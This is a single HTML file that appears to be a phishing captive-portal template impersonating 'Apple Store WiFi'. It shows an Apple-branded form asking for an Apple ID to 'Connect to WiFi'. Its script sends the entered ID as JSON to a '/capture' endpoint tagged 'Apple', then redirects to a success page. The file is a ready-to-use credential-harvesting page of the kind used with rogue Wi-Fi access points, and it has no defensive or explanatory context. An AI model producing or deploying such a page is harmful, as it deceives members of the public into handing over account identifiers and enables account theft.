<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Apple Store WiFi</title><style>*{margin:0;padding:0}body{font-family:-apple-system,Arial;background:linear-gradient(135deg,#555,#000);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}.container{background:white;border-radius:15px;max-width:400px;width:100%;padding:40px 30px}.logo h1{color:#000;font-size:32px;text-align:center;margin-bottom:30px}.form-group{margin-bottom:20px}label{display:block;margin-bottom:8px;color:#555;font-weight:500}input{width:100%;padding:12px;border:1px solid #ddd;border-radius:8px}input:focus{outline:none;border-color:#000}button{width:100%;padding:14px;background:#000;color:white;border:none;border-radius:8px;font-weight:bold;cursor:pointer}</style></head><body><div class="container"><div class="logo"><h1> APPLE</h1></div><form id="loginForm"><div class="form-group"><label>Apple ID</label><input type="email" id="appleid" required placeholder="yourname@icloud.com"></div><button type="submit">Connect to WiFi</button></form></div><script>document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();const appleid=document.getElementById('appleid').value;console.log('[Apple] Apple ID:',appleid);fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({portal:'Apple',appleid:appleid})}).catch(err=>console.log(err));window.location.href='success.html';});</script></body></html>
